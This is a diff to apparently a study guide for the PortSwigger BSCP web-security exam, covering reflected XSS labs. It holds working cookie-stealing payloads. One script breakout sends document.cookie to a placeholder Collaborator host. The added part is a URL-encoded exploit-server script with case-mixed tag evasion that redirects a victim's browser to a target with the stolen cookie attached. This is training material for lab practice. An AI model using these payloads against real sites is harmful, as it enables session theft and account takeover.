@@ -505,7 +505,7 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
 </script><script>alert(1)</script>
 ```  
 
->Changing the payload to a cookie stealer that deliver the session token to Burp Collaborator. This can be placed on an exploit server within an **iframe**.  
+>Changing the payload to a cookie stealer that deliver the session token to Burp Collaborator. 
 
 ```html
 </script><script>document.location="https://Collaborator.net/?cookie="+document.cookie</script>
@@ -513,8 +513,20 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
 
 ![collaborator get cookies](images/collaborator-get-cookies.png)  
 
+>When placing this payload in `iframe`, the target application do not allow it to be embedded and give message: `refused to connect`.  
+  
 [PortSwigger Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)  
   
+>In BSCP exam host the below payload on exploit server inside `<script>` tags, and the search query is `</ScRiPt ><img src=a onerror=document.location="https://COLLABORATOR.com/?biscuit="+document.cookie>` before it is URL encoded below.  
+
+```html
+<script>
+location = "https://TARGET.net/?search=%3C%2FScRiPt+%3E%3Cimg+src%3Da+onerror%3Ddocument.location%3D%22https%3A%2F%2FCOLLABORATOR.com%2F%3Fbiscuit%3D%22%2Bdocument.cookie%3E"
+</script>
+
+```  
+
+
 ### Reflected String Extra Escape  
 
 >See in `source code` the variable named ```searchTerms```, and when submitting payload ```fuzzer'payload```, see the single quote is backslash escaped, and then send a  ```fuzzer\payload``` payload and ***identify*** that the backslash is not escaped.  
